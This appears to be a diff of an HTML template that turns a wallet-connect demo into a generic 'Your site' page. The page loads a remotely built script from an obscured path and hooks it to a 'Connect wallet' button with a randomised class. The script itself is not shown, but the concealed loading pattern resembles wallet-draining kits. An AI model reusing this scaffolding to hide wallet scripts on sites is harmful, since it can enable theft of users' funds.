@@ -3,19 +3,12 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Wallet connect demo</title>
-    <link rel="icon" href="/favicon.ico" sizes="any" />
-
-    <!-- VPS PHP path → injects config + fetches bundle from Vercel (see vercel_bundle_url in config.php) -->
+    <title>Your site</title>
+    <!-- Path must match nginx location (e.g. /vault38472) -->
     <script src="/vault38472" defer></script>
   </head>
   <body>
-    <h1>Reown wallet connect</h1>
-    <p>
-      Page and script are on the same domain. Wallets show this site’s domain
-      (detected automatically).
-    </p>
-
+    <!-- Class must match WALLET_BUTTON_CLASS in Vercel env vars -->
     <button type="button" class="K7mQ2">Connect wallet</button>
   </body>
 </html>
